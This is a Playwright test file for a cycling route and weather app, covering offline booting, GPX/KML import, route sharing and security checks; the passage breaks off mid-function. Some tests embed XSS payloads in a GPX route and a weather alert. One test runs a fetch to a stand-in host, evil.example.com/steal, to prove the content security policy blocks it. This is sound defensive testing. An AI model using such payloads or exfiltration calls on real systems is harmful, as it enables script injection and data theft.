import { readFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { expect, test } from '@playwright/test';
import { findRemoteAssets } from '../scripts/build-www.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURE = join(HERE, 'fixtures/route.gpx');
const WWW = join(HERE, '../www');
const PUBLIC = join(HERE, '../../public');

/** Nothing but the app's own origin. This is what the native app really has when
 *  the phone is out of coverage, and what App Store review expects. */
async function goOffline(page) {
  await page.route('**/*', (route) => {
    const url = route.request().url();
    return url.startsWith('http://127.0.0.1') ? route.continue() : route.abort();
  });
}

/** Uncaught exceptions and failed same-origin requests: both mean the bundle is broken. */
function watchForBreakage(page) {
  const crashes = [];
  const missing = [];
  page.on('pageerror', (e) => crashes.push(e.message));
  page.on('response', (r) => {
    if (r.status() >= 400 && r.url().startsWith('http://127.0.0.1')) {
      missing.push(`${r.status()} ${r.url()}`);
    }
  });
  return { crashes, missing };
}

/** The loader swallows its own failures: it logs and shows an alert, so the route
 *  name can still appear while the track failed to reach the map. Watch for both. */
function watchTheLoader(page) {
  const failures = [];
  page.on('dialog', (d) => {
    failures.push(`alert: ${d.message()}`);
    d.dismiss().catch(() => {});
  });
  page.on('console', (m) => {
    if (m.type() !== 'error') return;
    if (/loader outer error|Cannot read properties|cargando GPX|reading GPX/i.test(m.text())) {
      failures.push(m.text());
    }
  });
  return failures;
}

const mapReady = (page) => page.waitForFunction(() => !!window.map, null, { timeout: 15000 });
const routeName = (page) => page.locator('#rutaName');

/** A track actually drawn on the map, not just a file that parsed. Scoped to Leaflet's
 *  overlay pane: the recentre and compass controls are SVG too, so a bare `#map path`
 *  always found something and proved nothing. */
const trackDrawn = (page) => page.locator('#map .leaflet-overlay-pane path');

test('boots with no network at all', async ({ page }) => {
  const { crashes, missing } = watchForBreakage(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Every library the app needs must come from the bundle, not a CDN.
  const globals = await page.evaluate(() => ({
    leaflet: typeof window.L,
    leafletGpx: typeof window.L?.GPX,
    compass: typeof window.L?.Control?.Compass,
    sunCalc: typeof window.SunCalc,
    pako: typeof window.pako,
    toGeoJSON: typeof window.toGeoJSON,
    loader: typeof window.cwLoadGPXFromString,
    injector: typeof window.cwInjectGPXFromText,
  }));
  expect(globals).toEqual({
    leaflet: 'object',
    leafletGpx: 'function',
    compass: 'function',
    sunCalc: 'object',
    pako: 'object',
    toGeoJSON: 'object',
    loader: 'function',
    injector: 'function',
  });

  expect(missing, 'the bundle is missing files').toEqual([]);
  expect(crashes, 'the page threw while booting').toEqual([]);
});

// Not just index.html: marker icons and a donation button were being pulled from
// other sites by the scripts and the help pages, which an offline app cannot do.
test('the bundle fetches no assets from anywhere else', async () => {
  expect(await findRemoteAssets(WWW)).toEqual([]);
  // A payment link outside the store fails App Store review (guideline 3.1.1); the
  // build strips the help pages' donation section and this proves it stayed gone.
  for (const page of ['help.html', 'help_en.html']) {
    const html = await readFile(join(WWW, page), 'utf8');
    expect(html).not.toMatch(/buymeacoffee/i);
    expect(html).not.toMatch(/Apoya el Proyecto|Support the Project/);
    expect(html).toMatch(/Consejo final|Final tip/);   // the section before it survives
  }
});

// Read from public/, not from the bundle: build-www.mjs strips these blocks, so
// asserting over www/ would pass no matter how broken the markup is.
test('structured data parses', async () => {
  const html = await readFile(join(PUBLIC, 'index.html'), 'utf8');
  const blocks = [...html.matchAll(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/g)];
  expect(blocks.length, 'no structured data found at all').toBeGreaterThan(0);
  for (const [, block] of blocks) {
    expect(() => JSON.parse(block)).not.toThrow();
  }
});

test('loads a route from the file picker', async ({ page }) => {
  const loaderFailures = watchTheLoader(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

/** Every stored recent route as {id, name, bytes, fingerprint}, read straight from IndexedDB. */
const storedRoutes = (page) =>
  page.evaluate(
    () =>
      new Promise((resolve, reject) => {
        const open = indexedDB.open('meteoride_recent_routes_db');
        open.onerror = () => reject(open.error);
        open.onsuccess = () => {
          const all = open.result.transaction('routes').objectStore('routes').getAll();
          all.onerror = () => reject(all.error);
          all.onsuccess = () =>
            resolve(
              all.result
                .map((r) => ({ id: r.id, name: r.name, bytes: r.blob ? r.blob.size : 0, fingerprint: r.fingerprint }))
                .sort((a, b) => a.id - b.id)
            );
        };
      })
  );

test('opening an older recent route keeps every stored route, fingerprint included', async ({ page }) => {
  await goOffline(page);
  const tracks = ['Ruta Uno', 'Ruta Dos', 'Ruta Tres'];
  for (const [i, track] of tracks.entries()) {
    // A fresh page each time, as a rider opening one route per session would.
    await page.goto('/index.html');
    await mapReady(page);
    const gpx = (await readFile(FIXTURE, 'utf8')).replace('Masnou - Montgat', track);
    await page.locator('#gpxFile').setInputFiles({
      name: `ruta-${i}.gpx`,
      mimeType: 'application/gpx+xml',
      buffer: Buffer.from(gpx),
    });
    await expect.poll(async () => (await storedRoutes(page)).length).toBe(i + 1);
  }

  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().length)).toBe(3);
  const before = await storedRoutes(page);
  expect(before.every((r) => r.bytes > 0)).toBe(true);
  // Without it a route counts as one from an older version, matched by name and size only.
  expect(before.every((r) => r.fingerprint), 'an imported route has its fingerprint').toBe(true);

  // The oldest one, last in the list.
  const oldest = await page.evaluate(async () => {
    const meta = window.getRecentRoutes().at(-1);
    await window.loadRecentRoute(meta);
    return meta.name;
  });
  expect(oldest).toBe('ruta-0.gpx');
  await expect.poll(() => storedRoutes(page)).toEqual(before);

  // Next cold start: the route just opened comes first, and every route still opens.
  await page.goto('/index.html');
  await mapReady(page);
  await expect.poll(() => page.evaluate(() => window.getRecentRoutes().length)).toBe(3);
  expect(await page.evaluate(() => window.getRecentRoutes()[0].name)).toBe(oldest);
  for (const i of [1, 2, 0]) {
    const text = await page.evaluate(async (name) => {
      window.lastGPXFile = null;
      await window.loadRecentRoute(window.getRecentRoutes().find((r) => r.name === name));
      return window.lastGPXFile ? window.lastGPXFile.text() : null;
    }, `ruta-${i}.gpx`);
    expect(text).toContain(tracks[i]);
  }
  await expect.poll(() => storedRoutes(page)).toEqual(before);
});

test('loads a route from ?gpx_url=', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);
  await goOffline(page);
  // Registered after goOffline on purpose: Playwright runs the most recent handler
  // first, so this one wins over the catch-all and serves the fixture from memory.
  await page.route(
    (url) => url.pathname === '/hosted-route.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: gpx })
  );

  await page.goto('/index.html?gpx_url=/hosted-route.gpx&name=Hosted%20route');
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

/** Records every message that passes through the notice slot.
 *  There is only one, and the last writer wins, so sampling it at the end of a test
 *  misses a message that appeared and was replaced. */
async function recordNotices(page) {
  await page.addInitScript(() => {
    window.__notices = [];
    const watch = () => {
      const el = document.getElementById('horizonNotice');
      if (!el) return false;
      const push = () => {
        const text = el.textContent.trim();
        if (text && window.__notices[window.__notices.length - 1] !== text) window.__notices.push(text);
      };
      new MutationObserver(push).observe(el, { childList: true, characterData: true, subtree: true });
      push();
      return true;
    };
    if (!watch()) {
      const iv = setInterval(() => { if (watch()) clearInterval(iv); }, 50);
    }
  });
}

/** Stand-in for the bridge Capacitor injects into the web view, implementing the same
 *  MeteoRideShare contract as the iOS and Android plugins. `delayMs` makes a drain slow
 *  enough to collide with a second request, which is the interesting case. */
async function installNativeBridge(page, { routes = [], delayMs = 0, notifications = 'granted', background = 'available' } = {}) {
  await page.addInitScript(
    ({ routes: initial, delayMs: delay, notifications: answer, background: bg }) => {
      const pending = [...initial];
      // What the system will answer when asked for notification permission.
      window.__notifAnswer = answer;
      window.__bgStatus = bg;
      window.__notifAsked = false;
      window.__runnerEvents = [];
      window.__delivered = [];
      window.__enqueue = (route) => pending.push(route);
      window.__prefsRead = () => {
        try { return JSON.parse(sessionStorage.getItem('__prefs') || '{}'); }
        catch (_) { return {}; }
      };
      window.__swRegistered = false;

      const register = navigator.serviceWorker?.register;
      if (register) {
        navigator.serviceWorker.register = function (...args) {
          window.__swRegistered = true;
          return register.apply(navigator.serviceWorker, args);
        };
      }

      const noop = { addListener: async () => ({ remove() {} }) };
      window.Capacitor = {
        isNativePlatform: () => true,
        getPlatform: () => 'ios',
        Plugins: {
          MeteoRideShare: {
            ...noop,
            consumePending: async () => {
              // Snapshot on arrival, like native code reading its inbox: a route that
              // lands while this call is in flight is NOT in this call's answer.
              const next = pending.shift();
              if (delay) await new Promise((r) => setTimeout(r, delay));
              if (next) window.__delivered.push(next.name);
              return next || {};
            },
            backgroundRefreshStatus: async () => ({ status: window.__bgStatus }),
          },
          App: {
            addListener: async (event, cb) => {
              (window.__appListeners = window.__appListeners || {})[event] = cb;
              return { remove() {} };
            },
          },
          StatusBar: { setStyle: async () => {}, setBackgroundColor: async () => {} },
          SplashScreen: { hide: async () => {} },
          // Native storage outlives the page, so the stub is backed by sessionStorage
          // and written through on every set: a reload right after a save must not
          // lose it, which is exactly what the code under test relies on.
          Preferences: {
            // Read when asked, as native storage is; a test can hold the answer with `__prefsHeld`.
            get: async ({ key }) => {
              const value = (window.__prefsRead() || {})[key] ?? null;
              if (window.__prefsHeld) await window.__prefsHeld;
              return { value };
            },
            set: async ({ key, value }) => {
              const all = window.__prefsRead() || {};
              all[key] = value;
              sessionStorage.setItem('__prefs', JSON.stringify(all));
            },
          },
          Filesystem: {
            writeFile: async (opts) => {
              window.__written = { path: opts.path, directory: opts.directory, data: opts.data };
              return { uri: 'file:///tmp/' + opts.path };
            },
          },
          Share: {
            share: async (opts) => {
              window.__shared = opts;
              return { activityType: 'test' };
            },
          },
          // The background runner's foreground face: the app only ever stores and
          // reads the watch through it. Backed by sessionStorage like Preferences.
          // The key is the name the plugin registers with the bridge, which is NOT
          // its npm export — tests/plugin-names.test.mjs keeps the two in step.
          // A test can hold the system's permission answer (`__permissionHeld`, a promise), and
          // the runner's answer to the next save of a watch (`__runnerHoldNext`), to the next
          // disarm (`__runnerHoldDisarm`) and to the next read (`__runnerHoldLoad`); reads fail
          // while `__runnerLoadFails` is set, and the next disarm fails once `__runnerDisarmFails` is. A save lands in the store when the runner answers
          // it, which is when native code would have written it; `__runnerStored` lists what
          // landed, in that order.
          CapacitorBackgroundRunner: {
            checkPermissions: async () => ({ notifications: sessionStorage.getItem('__notif') || 'prompt' }),
            requestPermissions: async () => {
              window.__notifAsked = true;
              if (window.__permissionHeld) await window.__permissionHeld;
              if (!sessionStorage.getItem('__notif')) sessionStorage.setItem('__notif', window.__notifAnswer);
              return { notifications: sessionStorage.getItem('__notif') };
            },
            dispatchEvent: async ({ label, event, details }) => {
              window.__runnerEvents.push({ label, event, details });
              const hold = event === 'loadWatch' ? '__runnerHoldLoad' : details.watch ? '__runnerHoldNext' : '__runnerHoldDisarm';
              const held = window[hold];
              if (held) { window[hold] = null; await held; }
              if (event === 'saveWatch' && !details.watch && window.__runnerDisarmFails) {
                window.__runnerDisarmFails = false;
                throw new Error('the runner could not clear the watch');
              }
              if (event === 'saveWatch') {
                sessionStorage.setItem('__watch', JSON.stringify(details.watch || null));
                window.__runnerStored = (window.__runnerStored || []).concat([details.watch || null]);
              }
              if (event === 'loadWatch') {
                if (window.__runnerLoadFails) throw new Error('the runner could not read the watch');
                return JSON.parse(sessionStorage.getItem('__watch') || 'null');
              }
              return undefined;
            },
          },
          LocalNotifications: {
            createChannel: async (channel) => { window.__channel = channel; },
          },
        },
      };
    },
    { routes, delayMs, notifications, background }
  );
}

test('the native shell hands a shared route to the app', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Shared route.gpx', gpx }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  // The route arrives before initMap runs; injecting too early used to blow up here.
  expect(loaderFailures).toEqual([]);

  expect(await page.evaluate(() => document.documentElement.className)).toContain('cw-native');
  // The plugin replaces the service-worker handoff; registering it would be wrong.
  expect(await page.evaluate(() => window.__swRegistered)).toBe(false);
});

// Both native inboxes take .kml as well as .gpx. The file picker converts KML; a KML
// that came through a share used to go straight to the GPX loader and be refused.
test('a KML shared from another app is converted, not refused', async ({ page }) => {
  const kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0 2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</Placemark></Document></kml>`;
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Costa.kml', gpx: kml }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

// Recomputing used to re-read window.lastGPXFile by its extension. A shared KML converted
// to GPX but still filed under its original .kml name looked like KML again on the next
// settings-driven recompute, went back through the KML converter and lost its track.
test('a shared KML keeps its track after the forecast is recomputed', async ({ page }) => {
  const kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0 2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</Placemark></Document></kml>`;
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Costa.kml', gpx: kml }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(trackDrawn(page)).not.toHaveCount(0);

  // Trigger a recompute the same way any settings control does: a reactive control's
  // change handler ends by calling cw.settingsChanged().
  await page.evaluate(() => {
    const el = document.getElementById('distanceUnits');
    el.value = el.value === 'km' ? 'mi' : 'km';
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
  expect(await page.evaluate(() => window.lastGPXFile && window.lastGPXFile.name)).toMatch(/\.gpx$/i);
});

// togeojson turns a KML <MultiGeometry> into a GeoJSON GeometryCollection, a type
// geojsonToGpx did not handle: the track silently disappeared.
test('a shared KML with a MultiGeometry is drawn', async ({ page }) => {
  const kml = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<MultiGeometry>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0</coordinates></LineString>
<LineString><coordinates>2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</MultiGeometry>
</Placemark></Document></kml>`;
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Costa.kml', gpx: kml }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

// The KML sniff only looks at the first 4096 characters; a long comment ahead of the
// <kml> element pushes it past that window. The file name still says .kml.
test('a shared file named .kml is converted even when <kml comes late', async ({ page }) => {
  const padding = `<!-- ${'x'.repeat(5000)} -->`;
  const kml = `<?xml version="1.0" encoding="UTF-8"?>
${padding}
<kml xmlns="http://www.opengis.net/kml/2.2"><Document><Placemark><name>Costa</name>
<LineString><coordinates>2.4120,41.4800,0 2.4200,41.4850,0 2.4300,41.4900,0 2.4400,41.4950,0</coordinates></LineString>
</Placemark></Document></kml>`;
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'Costa.kml', gpx: kml }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
});

// kmlToGpxText always returns a syntactically valid GPX wrapper, even for input that
// carries no Placemark (togeojson.kml() returns an empty FeatureCollection rather than
// null). A real GPX shared under a .kml name used to be run through the KML converter
// on the strength of its name alone and come out empty.
test('a real GPX shared under a .kml name is drawn, not emptied', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  await installNativeBridge(page, { routes: [{ name: 'route.kml', gpx }] });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
  // Keeping it decided on the empty conversion alone, so the route opened but was never kept.
  await expect.poll(() => storedNames(page), 'shown but not kept among recent routes').toEqual(['route.kml']);

  // The KML conversion is rejected (this text isn't KML), but the name still ends in
  // .gpx, and a recompute keeps the track.
  await page.evaluate(() => {
    const el = document.getElementById('distanceUnits');
    el.value = el.value === 'km' ? 'mi' : 'km';
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });

  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(loaderFailures).toEqual([]);
  expect(await page.evaluate(() => window.lastGPXFile && window.lastGPXFile.name)).toMatch(/\.gpx$/i);
});

test('a route arriving mid-drain is not left behind', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  const loaderFailures = watchTheLoader(page);

  const DELAY = 400;
  await installNativeBridge(page, { delayMs: DELAY });
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);

  // The shell drains once at boot. Let that finish, or it swallows the request below
  // and the test stops exercising anything.
  await page.waitForTimeout(DELAY * 2);

  // Drain one route. The drain then asks again, and that second call comes back empty.
  await page.evaluate((text) => {
    window.__enqueue({ name: 'first.gpx', gpx: text });
    window.cwConsumePendingShare();
  }, gpx);

  // Land the second route while that empty call is still in flight: after it was
  // dispatched and before it resolves. That window is the whole point of the test.
  await page.waitForTimeout(DELAY * 1.5);
  await page.evaluate((text) => {
    window.__enqueue({ name: 'second.gpx', gpx: text });
    window.cwConsumePendingShare();
  }, gpx);

  // Nothing else will trigger a drain. Only re-running after a request that arrived
  // mid-drain can deliver this one.
  await expect
    .poll(() => page.evaluate(() => window.__delivered), { timeout: 10000 })
    .toEqual(['first.gpx', 'second.gpx']);
  expect(loaderFailures).toEqual([]);
});

// leaflet-gpx concatenates waypoint <name> and <desc> into an HTML popup string, so a
// route is executable content. It reaches the app from a link, from another app's share
// sheet, or from a file — and it would run in the origin holding the provider API key,
// with the Capacitor bridge in reach.
test('a booby-trapped route cannot run script', async ({ page }) => {
  const evil = `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="evil" xmlns="http://www.topografix.com/GPX/1/1">
  <wpt lat="41.479" lon="2.316">
    <name>&lt;img src=x onerror="window.__pwned = 'yes'"&gt;</name>
    <desc>&lt;script&gt;window.__pwned = 'yes'&lt;/script&gt;</desc>
  </wpt>
  <trk><name>Evil</name><trkseg>
    <trkpt lat="41.4790" lon="2.3160"/><trkpt lat="41.4770" lon="2.3050"/>
  </trkseg></trk>
</gpx>`;

  await goOffline(page);
  await page.route(
    (url) => url.pathname === '/evil.gpx',
    (route) => route.fulfill({ status: 200, contentType: 'application/gpx+xml', body: evil })
  );

  await page.goto('/index.html?gpx_url=/evil.gpx');
  await mapReady(page);
  await expect(trackDrawn(page)).not.toHaveCount(0);

  expect(await page.evaluate(() => window.__pwned), 'the route executed script').toBeUndefined();

  // The waypoint text still reaches the user, as text. leaflet-gpx parses
  // asynchronously and adds waypoints after the track, so poll rather than peek once.
  const readPopups = () =>
    page.evaluate(() => {
      const found = [];
      const walk = (layer) => {
        if (layer.getPopup && layer.getPopup()) found.push(String(layer.getPopup().getContent()));
        if (layer.eachLayer) layer.eachLayer(walk);
      };
      window.map.eachLayer(walk);
      return found;
    });
  await expect
    .poll(async () => (await readPopups()).length, { message: 'no waypoint popup was built', timeout: 10000 })
    .toBeGreaterThan(0);

  for (const html of await readPopups()) {
    expect(html).not.toMatch(/<img|<script/i);
    expect(html).toContain('&lt;img');
  }
});

// Official weather alerts arrive through a provider's API as free text written by
// national met services. That text used to be dropped into innerHTML.
test('a hostile weather alert is shown as text', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const card = await page.evaluate(() => {
    const el = createAlertElement({
      event: '<img src=x onerror="window.__alertPwned = 1"> Warning',
      senderName: '<b>AEMET</b>',
      description: '<script>window.__alertPwned = 1</script> Viento fuerte',
      start: 1700000000,
      end: 1700003600,
    });
    document.body.appendChild(el);
    return {
      text: el.textContent,
      markupElements: el.querySelectorAll('img, script, b').length,
      closeButtons: el.querySelectorAll('button').length,
    };
  });

  // No element was ever created from the text, so nothing could have fired.
  expect(card.markupElements).toBe(0);
  expect(await page.evaluate(() => window.__alertPwned)).toBeUndefined();
  expect(card.text).toContain('Viento fuerte');
  expect(card.text).toContain('AEMET');
  expect(card.closeButtons).toBe(1);
});

// Warnings found along the route belong to the computation and appear when it is
// published, from the per-point lookups as well as from the forecast answers.
test('official warnings found along the route are shown with its forecast', async ({ page }) => {
  const now = Math.floor(Date.now() / 1000);
  await stubProvider(page, { celsius: 20, offline: false });
  await page.route((url) => url.hostname === 'api.openweathermap.org', (route) => route.fulfill({
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({ alerts: [{ sender_name: 'AEMET', event: 'Aviso amarillo por viento',
      start: now, end: now + 12 * 3600, description: 'Rachas fuertes' }] }),
  }));
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { document.getElementById('apiKeyOW').value = 'a-valid-looking-key'; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(page.locator('#weather-alerts-container')).toContainText('Aviso amarillo por viento');
});

// revalidateWeatherAlerts looked warnings up again on its own whenever the speed, the
// interval or the date changed, hid the ones on screen and showed what it found, outside
// any computation. Warnings now change only when the computation that found them publishes.
test('official warnings on screen change only when the next forecast publishes', async ({ page }) => {
  const now = Math.floor(Date.now() / 1000);
  const control = { event: 'Aviso amarillo por viento', alertRequests: 0, held: null };
  await page.route((url) => url.hostname === 'api.open-meteo.com', async (route) => {
    if (control.held) await control.held;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(forecastAt(20)) });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.route((url) => url.hostname === 'api.openweathermap.org', (route) => {
    control.alertRequests++;
    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ alerts: [{
      sender_name: 'AEMET', event: control.event, start: now, end: now + 12 * 3600, description: 'x' }] }) });
  });
  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => { document.getElementById('apiKeyOW').value = 'a-valid-looking-key'; });
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  const alerts = page.locator('#weather-alerts-container');
  await expect(alerts).toContainText('Aviso amarillo por viento');
  await expect(alerts).toBeVisible();

  // The next computation waits at the provider, so it has not looked up its warnings yet.
  let release;
  control.held = new Promise((r) => { release = r; });
  control.event = 'Aviso naranja por lluvia';
  await page.evaluate(() => {
    for (const k of Object.keys(localStorage)) if (k.includes('alerts_')) localStorage.removeItem(k);
  });
  const asked = control.alertRequests;
  await setSpeed(page, 20);
  await page.evaluate(() => document.getElementById('cyclingSpeed')
    .dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter' })));
  await page.waitForTimeout(800);
  expect(control.alertRequests, 'warnings looked up outside the computation').toBe(asked);
  await expect(alerts).toBeVisible();
  await expect(alerts).toContainText('Aviso amarillo por viento');

  control.held = null;
  release();
  await expect(alerts).toContainText('Aviso naranja por lluvia');
  await expect(alerts).not.toContainText('Aviso amarillo por viento');
});

// The website's policy comes from public/_headers, a Cloudflare file that is stripped
// from the bundle. The app carries its own, and it matters more here: script running
// in the app reaches window.Capacitor.Plugins.
test('the bundle carries its own content security policy', async ({ page }) => {
  for (const name of ['index.html', 'help.html', 'help_en.html']) {
    const html = await readFile(join(WWW, name), 'utf8');
    const meta = html.match(/<meta http-equiv="Content-Security-Policy" content="([^"]+)"/);
    expect(meta, `${name} has no CSP`).not.toBeNull();
    const policy = meta[1];
    // 'unsafe-inline' in script-src would give back exactly what the policy is for.
    expect(policy).toMatch(/script-src 'self'\s*;/);
    expect(policy).toContain("object-src 'none'");
    expect(policy).toContain("base-uri 'self'");
    // A closed connect-src list is what stops a stolen API key from being posted
    // anywhere. The app, unlike the website, never reaches ?gpx_url=, so it can
    // afford to name its hosts. Bare `https:` would give that away.
    expect(policy).toMatch(/connect-src 'self' https:\/\/\S/);
    expect(policy).not.toMatch(/connect-src[^;]*https:(?:\s|;|$)/);
  }

  // It has to actually apply, not merely be present.
  await goOffline(page);
  await page.addInitScript(() => {
    window.__blocked = [];
    document.addEventListener('securitypolicyviolation', (e) => window.__blocked.push(e.violatedDirective));
  });
  await page.goto('/index.html');
  await mapReady(page);

  await page.evaluate(() => {
    document.body.insertAdjacentHTML('beforeend', '<img src=x onerror="window.__pwned = 1">');
  });
  await page.waitForTimeout(300);

  expect(await page.evaluate(() => window.__pwned)).toBeUndefined();
  expect(await page.evaluate(() => window.__blocked)).toContain('script-src-attr');

  // And the page cannot talk to a host the policy does not name.
  await page.evaluate(() =>
    fetch('https://evil.example.com/steal', { mode: 'no-cors' }).catch(() => {})
  );
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__blocked)).toContain('connect-src');
});

// Komoot to MeteoRide to a head unit: the app has to be able to pass the route on,
// which means handing a real file to the system share sheet.
test('the app can send the loaded route to another app', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  const button = page.locator('#cwShareRoute');
  await expect(button).toHaveCount(1);

  // Nothing loaded yet: it must decline rather than share an empty file or throw.
  await button.click();
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => window.__shared)).toBeFalsy();

  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await button.click();

  await expect.poll(() => page.evaluate(() => window.__shared)).toBeTruthy();
  const written = await page.evaluate(() => window.__written);
  const shared = await page.evaluate(() => window.__shared);

  // The bytes handed over are the route that was loaded, not a re-rendering of it.
  expect(written.data).toBe(await readFile(FIXTURE, 'utf8'));
  expect(written.directory).toBe('CACHE');
  expect(shared.files).toEqual([`file:///tmp/${written.path}`]);
  expect(written.path).toMatch(/\.gpx$/);
});

// The website must not grow a button that depends on plugins it does not have.
test('the share button exists only in the app', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#cwShareRoute')).toHaveCount(0);
});

// The chain the native build exists for, end to end: a route arrives from another app
// through the share plugin, and goes back out through the share sheet.
test('a route received from another app can be passed on', async ({ page }) => {
  const gpx = await readFile(FIXTURE, 'utf8');
  await installNativeBridge(page, { routes: [{ name: 'Komoot tour.gpx', gpx }] });
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');

  await page.locator('#cwShareRoute').click();
  await expect.poll(() => page.evaluate(() => window.__shared)).toBeTruthy();

  const written = await page.evaluate(() => window.__written);
  // What leaves is the route that came in, under the name the sending app gave it.
  expect(written.data).toBe(gpx);
  expect(written.path).toBe('Komoot tour.gpx');
});

/* ---------- riding without coverage ---------- */

/** A forecast the provider would return, at a temperature we can look for. */
function forecastAt(celsius) {
  const hours = Array.from({ length: 72 }, (_, i) =>
    new Date(Date.now() + i * 3600000).toISOString().slice(0, 13) + ':00'
  );
  const fill = (v) => hours.map(() => v);
  return {
    hourly: {
      time: hours,
      temperature_2m: fill(celsius),
      precipitation: fill(0),
      precipitation_probability: fill(5),
      relative_humidity_2m: fill(60),
      wind_speed_10m: fill(12),
      wind_gusts_10m: fill(20),
      winddirection_10m: fill(180),
      weathercode: fill(1),
      uv_index: fill(3),
      is_day: fill(1),
      cloud_cover: fill(20),
    },
  };
}

/** What the ride watch asks for: several locations at once, unix times, km/h. */
function watchForecast(url, { rain = 0, wind = 10, gust = 15 } = {}) {
  const n = (url.searchParams.get('latitude') || '').split(',').length;
  const base = Math.floor(Date.now() / 3600000) * 3600;
  const time = Array.from({ length: 72 }, (_, i) => base + i * 3600);
  const fill = (v) => time.map(() => v);
  return Array.from({ length: n }, () => ({
    hourly: { time, precipitation: fill(rain), wind_speed_10m: fill(wind), wind_gusts_10m: fill(gust) },
  }));
}

/** Serves the forecast the control object names, or fails the request. */
async function stubProvider(page, control) {
  await page.route(
    (url) => url.hostname === 'api.open-meteo.com',
    (route) => {
      if (control.offline) return route.abort();
      const url = new URL(route.request().url());
      const body = url.searchParams.get('timeformat') === 'unixtime'
        ? watchForecast(url, control.watch)
        : forecastAt(control.celsius);
      return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(body) });
    }
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
}

const shownTemperatures = (page) =>
  page.evaluate(() =>
    [...document.querySelectorAll('#weatherTable td')]
      .map((c) => c.textContent.trim())
      .filter((t) => /^-?\d+º$/.test(t))
  );

/** Pushes every cached forecast back in time, past the normal 30 minute lifetime. */
const ageTheCache = (page, minutes) =>
  page.evaluate((mins) => {
    for (const key of Object.keys(localStorage)) {
      if (!key.startsWith('cw_weather_')) continue;
      const entry = JSON.parse(localStorage.getItem(key));
